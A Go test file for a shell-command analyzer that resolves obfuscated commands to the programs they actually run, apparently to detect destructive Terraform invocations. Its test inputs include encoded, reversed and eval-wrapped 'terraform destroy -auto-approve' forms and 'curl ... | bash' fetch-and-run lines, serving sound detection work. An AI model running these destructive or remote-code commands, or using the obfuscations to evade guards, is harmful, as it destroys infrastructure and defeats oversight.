package shell

import (
	"errors"
	"strings"
	"testing"
	"time"
)

func fakeFS(files map[string]string) func(string) ([]byte, error) {
	return func(p string) ([]byte, error) {
		if s, ok := files[p]; ok {
			return []byte(s), nil
		}
		return nil, errors.New("not found")
	}
}

func render(r *Result) []string {
	var out []string
	for _, inv := range r.Invocations {
		out = append(out, inv.Dir+": "+joinWords(inv.Args))
	}
	for _, p := range r.Problems {
		out = append(out, "PROBLEM: "+p.Reason)
	}
	return out
}

func TestAnalyze(t *testing.T) {
	fs := fakeFS(map[string]string{
		"/repo/Makefile":           "TF ?= terraform\n.PHONY: destroy\ndestroy: init\n\t@$(TF) destroy -auto-approve\ninit:\n\t$(TF) init\n",
		"/repo/scripts/down.sh":    "#!/usr/bin/env bash\nset -e\ncd envs/prod\nterraform destroy -auto-approve\n",
		"/repo/tools/x.py":         "#!/usr/bin/env python3\nimport os\nos.system('terraform destroy')\n",
		"/repo/envs/prod/Makefile": "plan:\n\tterraform plan\n",
	})
	cases := []struct {
		cmd  string
		want []string // substrings that must each appear in the rendered output
		not  []string
	}{
		{"terraform destroy -auto-approve", []string{"/repo: terraform destroy -auto-approve"}, nil},
		{"cd envs/prod && terraform destroy", []string{"/repo/envs/prod: terraform destroy"}, nil},
		{"(cd envs/prod; terraform plan); terraform destroy", []string{"/repo/envs/prod: terraform plan", "/repo: terraform destroy"}, nil},
		{"d=destroy; terraform $d", []string{"/repo: terraform destroy"}, nil},
		{"export A=destroy; bash -c 'terraform $A'", []string{"/repo: terraform destroy"}, nil},
		{"A=destroy; bash -c 'terraform $A'", []string{"/repo: terraform <?>"}, nil},
		{`t"er"ra\form de'str'oy`, []string{"/repo: terraform destroy"}, nil},
		{`$'\x74erraform' destroy`, []string{"/repo: terraform destroy"}, nil},
		{"$(echo terraform) destroy", []string{"/repo: terraform destroy", "/repo: echo terraform"}, nil},
		{"`which terraform` destroy", []string{"/repo: terraform destroy"}, nil},
		{"echo dGVycmFmb3JtIGRlc3Ryb3kgLWF1dG8tYXBwcm92ZQ== | base64 -d | sh", []string{"/repo: terraform destroy -auto-approve"}, nil},
		{"echo dGVycmFmb3JtIGRlc3Ryb3kgLWF1dG8tYXBwcm92ZQ== | base64 --decode | bash -s", []string{"/repo: terraform destroy -auto-approve"}, nil},
		{"curl -s https://example.invalid/x | bash", []string{"PROBLEM: text piped into bash cannot be resolved"}, nil},
		{`eval "$(curl -s https://example.invalid/x)"`, []string{"PROBLEM: eval of text"}, nil},
		{`eval "terraform destroy"`, []string{"/repo: terraform destroy"}, nil},
		{"bash <<'EOF'\nterraform destroy -auto-approve\nEOF", []string{"/repo: terraform destroy -auto-approve"}, nil},
		{"sh -c \"$CMD\"", []string{"PROBLEM: sh -c with a command string"}, nil},
		{"make destroy", []string{"/repo: terraform init", "/repo: terraform destroy -auto-approve"}, nil},
		{"make -C envs/prod plan", []string{"/repo/envs/prod: terraform plan"}, nil},
		{"make -n destroy", nil, []string{"terraform"}},
		{"./scripts/down.sh", []string{"/repo/envs/prod: terraform destroy -auto-approve"}, nil},
		{"bash scripts/down.sh", []string{"/repo/envs/prod: terraform destroy -auto-approve"}, nil},
		{"python3 tools/x.py", []string{"PROBLEM: "}, nil},
		{`python3 -c "import os; os.system('terraform destroy')"`, []string{"PROBLEM: python3 code mentions"}, nil},
		{"sudo -u ops env AWS_PROFILE=prod timeout 30 terraform apply -auto-approve", []string{"/repo: terraform apply -auto-approve"}, nil},
		{"for c in plan destroy; do terraform $c; done", []string{"/repo: terraform plan", "/repo: terraform destroy"}, nil},
		{"f(){ terraform \"$@\"; }; f destroy", []string{"/repo: terraform <?>"}, nil},
		{"f(){ terraform $1; }; f destroy", []string{"/repo: terraform destroy"}, nil},
		{"terraform {destroy,plan}", []string{"/repo: terraform destroy plan"}, nil},
		{"find . -name '*.tf' -exec terraform destroy \\;", []string{"/repo: terraform destroy"}, nil},
		{"docker run --rm -v $PWD:/w hashicorp/terraform:1.9 destroy -auto-approve", []string{"/repo: terraform destroy -auto-approve"}, nil},
		{"alias tf=terraform; tf destroy", []string{"/repo: terraform destroy"}, nil},
		{"git commit -m 'never run terraform destroy'", []string{"/repo: git commit -m never run terraform destroy"}, []string{"PROBLEM"}},
		{`grep -rn "terraform destroy" docs/`, []string{"/repo: grep -rn terraform destroy docs/"}, []string{"PROBLEM"}},
		{"echo 'terraform destroy' >> NOTES.md", []string{"/repo: echo terraform destroy"}, []string{"PROBLEM"}},
		{"rm -rf .terraform && terraform init", []string{"/repo: rm -rf .terraform", "/repo: terraform init"}, nil},
		{"watch -n 5 terraform state list", []string{"/repo: terraform state list"}, nil},
		{"env -C envs/prod terraform destroy", []string{"/repo/envs/prod: terraform destroy"}, nil},
		{"echo 7465727261666f726d2064657374726f79 | xxd -r -p | sh", []string{"/repo: terraform destroy"}, nil},
		{"echo yortsed mrofarret | rev | sh", []string{"/repo: terraform destroy"}, nil},
		{"if true; then terraform plan; else terraform destroy; fi", []string{"/repo: terraform plan", "/repo: terraform destroy"}, nil},
		{"terraform 'destroy", []string{"PROBLEM: could not parse"}, nil},
	}
	for _, c := range cases {
		r := Analyze(c.cmd, Options{Dir: "/repo", Env: map[string]string{"HOME": "/home/u"}, Aliases: map[string]string{}, ReadFile: fs})
		got := strings.Join(render(r), "\n")
		for _, w := range c.want {
			if !strings.Contains(got, w) {
				t.Errorf("%q: missing %q in\n%s", c.cmd, w, got)
			}
		}
		for _, n := range c.not {
			if strings.Contains(got, n) {
				t.Errorf("%q: unexpected %q in\n%s", c.cmd, n, got)
			}
		}
	}
}

func TestEnvTracking(t *testing.T) {
	r := Analyze("export AWS_PROFILE=prod-admin; TF_WORKSPACE=prod terraform apply", Options{Dir: "/r", ReadFile: fakeFS(nil)})
	if len(r.Invocations) != 1 {
		t.Fatalf("got %v", render(r))
	}
	env := r.Invocations[0].Env
	if env["AWS_PROFILE"] != "prod-admin" || env["TF_WORKSPACE"] != "prod" {
		t.Fatalf("env = %v", env)
	}
}

func TestPathologicalInputsAreBounded(t *testing.T) {
	nested := "terraform destroy"
	for i := 0; i < 40; i++ {
		nested = "$(echo " + nested + ")"
	}
	for _, cmd := range []string{
		strings.Repeat("{a,b}", 40),
		"x " + nested,
		strings.Repeat("eval ", 200) + "terraform destroy",
		strings.Repeat("$(", 300) + strings.Repeat(")", 300),
	} {
		done := make(chan struct{})
		go func() {
			Analyze(cmd, Options{Dir: "/r", ReadFile: fakeFS(nil)})
			close(done)
		}()
		select {
		case <-done:
		case <-time.After(2 * time.Second):
			t.Fatalf("analysis of %.40q... did not finish in 2s", cmd)
		}
	}
}

func TestFieldSplittingAndShellArgs(t *testing.T) {
	cases := map[string]string{
		`x="terraform destroy"; $x`:               "/r: terraform destroy",
		`x="terraform destroy"; "$x"`:             "/r: terraform destroy", // one word: "terraform destroy" as a program name
		`$(echo terraform destroy) -auto-approve`: "/r: terraform destroy -auto-approve",
		`sh -c 'terraform "$1"' _ destroy`:        "/r: terraform destroy",
		`IFS=,; x=terraform,destroy; $x`:          "/r: terraform,destroy<?>", // unresolved name
		`bash -c 'echo $0' foo`:                   "/r: echo foo",
	}
	for cmd, want := range cases {
		r := Analyze(cmd, Options{Dir: "/r", ReadFile: fakeFS(nil)})
		got := strings.Join(render(r), "\n")
		if !strings.Contains(got, want) {
			t.Errorf("%q: want %q in\n%s", cmd, want, got)
		}
	}
	r := Analyze(`x="terraform destroy"; "$x"`, Options{Dir: "/r", ReadFile: fakeFS(nil)})
	if len(r.Invocations) != 1 || len(r.Invocations[0].Args) != 1 {
		t.Errorf("quoted expansion must stay one word: %v", render(r))
	}
}
